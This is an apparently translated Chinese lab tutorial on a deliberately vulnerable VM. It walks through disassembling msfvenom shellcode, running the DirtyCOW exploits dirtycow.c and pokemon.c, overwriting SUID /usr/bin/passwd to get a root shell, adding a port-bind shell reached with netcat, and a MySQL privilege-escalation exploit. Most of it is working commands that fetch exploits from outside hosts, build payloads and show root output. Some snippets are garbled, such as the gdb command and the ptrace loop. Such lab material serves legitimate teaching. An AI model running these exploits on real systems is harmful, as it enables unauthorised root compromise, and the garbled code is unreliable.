

# 将 Shellcode 转换为汇编语言

通常情况下，你会使用由他人编写的漏洞利用代码。该漏洞利用代码中可能包含 shellcode。在运行之前，你必须理解该 shellcode！前往 Kali Linux 并生成一个新的 C 格式 shellcode：

```
msfvenom -p linux/x86/exec -a x86 CMD=/bin/bash
PrependSetuid=True -f c > myshell
```

现在打开你喜欢的 ASCII 编辑器并创建一个新的 C 源文件。写下以下内容（用上一条命令的输出替换占位符）：

```
#include <stdio.h>
<FAST_THE_SHELL_CODE_HERE>
void main(int argc, char **argv) { }
```

将其保存为 exploit.c。编译它，然后在 gdb 会话中打开二进制文件：

```
gcc exploit.c -o exploit
gdb -q exploit
```

shellcode 位于 `buf` 指向的地址处。在 gdb 中对该特定地址使用 `disassemble` 命令以获取漏洞利用代码：

```
(gdb) disas 8&uf
0x0804-8040   <+0> : xor %ebx, %ebx
0x0804-8042   <+2> : push $0x17
0x0804-8044   <+4> : pop %eax
0x0804-8045   <+5> : int $0x80
```

由于 `&buf` 指向一串操作码，gdb 在反汇编它们时毫无困难！

# 使用 DirtyCOW 覆盖文件

DirtyCOW 是一个内核竞态条件漏洞，允许任何非特权用户写入任何只读文件（甚至包括属于其他用户（如 root）的文件）。因此，通过覆盖 SUID root 二进制文件，它可能导致权限提升。WebSecurity Dojo 2.0 易受 DirtyCOW 影响。让我们来玩玩这个漏洞：使用 WebSecurity Dojo 下载第一个漏洞利用程序：

```
wget --no-check-certificate https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtycow.c
```

该漏洞利用程序是用 C 语言编写的，因此你必须编译它：

```
gcc dirtycow.c -o dirtycow -pthread
```

现在，在执行漏洞利用程序之前，通过按下右 CTRL+T 对 VM 进行快照；这样，如果出现问题，你将能够恢复之前的 VM 状态。这个 PoC 将允许你将字符串写入一个由 root 拥有且你只有只读权限的文件。首先，创建该文件并放入一些文本：

```
sudo echo "Root file" > test
sudo chmod 0404 test
```

现在，运行漏洞利用程序：

```
./dirtycow test "HELLO"
...
process1mem -100000000
```

如果你再次读取该文件，你会发现漏洞利用程序已失败。实际上，`test` 的内容完全没有被更改。漏洞利用程序的输出本身指出了错误可能在哪里：`process1mem -100000000`。使用你喜欢的 ASCII 编辑器打开漏洞利用程序的源代码，并查找 `process1mem` 字符串。该代码属于漏洞利用程序的两个线程之一：`processFimemThread`：

```
1 for(i=0;i<100000000;i++){
2  seekf((uintptr_t) map,SEEK_SET);
3  c+=write(f,str,strlen(str));
4  } printf("process1mem %d\n", c);
```

DirtyCOW 背后的想法是在两个线程之间触发竞态条件：一个线程调用 `madvise()`，另一个线程反复向映射到进程地址空间的文件写入，使用 `/proc/self/mem`。正如之前的输出所暗示的，负数意味着对 `write` 函数的每一次调用都失败了（第 3 行）。换句话说，显然你不允许向 `/proc/self/mem` 写入。然而，还有另一种向进程地址空间写入的方法：进入 `trace()`。现在让我们尝试第二个 PoC；先下载它：

```
wget --no-check-certificate https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c
```

> 你需要分析该漏洞利用程序真正做了什么，并在受控环境（VM）中执行它。

编译它：

```
gcc -pthread pokemon.c -o pokemon
```

再次尝试覆盖 `test`：

```
./pokemon test HELLO
```

最后，读取 `test` 文件并感到惊叹：

```
cat test
HELLOfile
```

这次它起作用了，但为什么？我们无法直接写入 `/proc/self/mem`，所以新的漏洞利用程序使用 `ptrace()` 调用来实现相同的目标。除了有一个第二个线程

![](img/1f330653f83dcf0397f7d224ce8bbc16_38_0.png)

调用 **write()]**，现在第二个线程调用 **ptrace** 一次写入一个字节（第 4–6 行）到 `test` 副本映射的地址：

```
1    for(i=0;i<10000/1;++i)
2       for(r=0;r<1;++r)
3        for(r=0;r<10000/1;++r)
4        c=ptrace(PTRACE_POKETEXT,pid, map_0, *(long*)(argv[2]+0));
5
6        *(long*)(argv[2]+0));
```

该漏洞利用程序的编写方式遵循标准方法，即通过调用 **fork()** 和 **ptrace(PTRACE_TRACEME)** 从父进程调试子进程（参见参考文献）。利用此漏洞允许我们覆盖文件，但不允许向其中追加数据。

## 使用 DirtyCOW 获取 root shell

如果你将之前学到的关于 shellcode 的知识与 ptrace 技术相结合，你可以用 shellcode 覆盖任何文件。如果你覆盖的文件是 **SUID** root 文件，你将能够生成一个 root shell。去获取下一个漏洞利用程序：

```
| wget http://tinyurl.com/9c6b5zh -O cdw.c
```

编译并执行它：

```
| gcc cdw.c -pthread -o cdw ; ./cdw
```

此漏洞利用程序将 **/usr/bin/passwd** 复制到 **/tmp/bak**，然后用你使用 **msfvenom** 生成的 shellcode 覆盖它。结果，一旦任何用户执行命令 **passwd**，就会生成一个 root shell。尝试一下：

```
|-$ passwd
   Segmentation fault
```

哦！取决于你的 VM 能力，你可能会看到一个 root shell 而不是触发 **segfault**。为什么会 **segfault**？请记住，DirtyCOW 是一个竞态条件漏洞。你有两个线程在同一个核心上运行：如果 **madvise()** 在主进程调用 **ptrace()** 将 shellcode 的每个字节写入到 **passwd** 副本所在的地址之前完成，ELF 文件将损坏。在这种情况下，你必须增加 **madvise()** 线程的迭代次数：

```
| sudo cp /tmp/bak /usr/bin/passwd
  ./cdw
  passwd
  root@d0jo2:/home/d0jo# whoami
  root
```

将 *i* 变量的值更改为更大的值，例如 900000000（第 3 行），重新编译漏洞利用程序并再次尝试（别忘了从 **/tmp/bak** 恢复原始 **passwd** 文件）：

## 如何使用端口绑定 shellcode 覆盖 passwd

现在你对这个 PoC 足够熟悉了，让我们改变 shellcode，以便一旦执行 **passwd**，我们就可以远程连接到服务器。回到你的 Kali Linux 并生成一个新的 ELF32 二进制文件，它将在 TCP 端口 8080 上监听，一旦建立连接就生成一个 root shell（这被称为端口绑定 shellcode）：

```
| msfvenom -p linux/x86/shell_bind_tcp -a x86
   LPORT=8080 -f elf |xxd -i > payload
```

在 WebSecurity Dojo 中，用这些新字节替换 **cdw.c** 内部 **shell_code[]** 缓冲区的字节。由于 shellcode 长度不同，别忘了也要更改 **sc_len**：

```
| unsigned int sc_len = 162;
```

重新编译漏洞利用程序并运行它；然后执行 **passwd**：

```
| passwd
```

回到你的 Kali VM 并使用 **netcat** 连接到 WebSecurityDojo：

```
| nc YOUR_DOJO_IP 8080
```

你现在已远程连接到 VM。输入命令 **whoami** 以查看你是否确实是 root：

```
| whoami
  root
```

## 在 MySQL 中提升权限

事实证明，WebSecurity Dojo 也容易受最新的 MySQL CVE 的影响。下载第一个漏洞利用程序：

```
| wget --no-check-certificate
   https://www.exploit-db.com/download/40678 -O 40678.c
```

安装 MySQL 客户端库并编译漏洞利用程序：

```
| sudo apt-get install libmysqlclient-dev
  gcc 40678.c -lmysqlclient -I/usr/include/mysql -O 40678
```

此漏洞利用程序在易受攻击的 mysql 版本上本地执行时可获得 mysql-suid shell。为了利用它，你需要先有一些有效的数据库凭据。创建一个新的数据库用户，使其具有 DWA 数据库的一些权限：

```
| mysql -u root -p
  mysql> use dwa;
  mysql> GRANT CREATE,SELECT,INSERT,DROP ON dwa.* TO attacker@localhost IDENTIFIED BY 'passwd';
  mysql> exit
```

使用这些凭据运行第一个漏洞利用程序：

```
| ./40678 attacker passwd localhost dwa
   [+] Bingo! Race won (4 tries)
   [+] Spawning the mysql SUID shell now
```

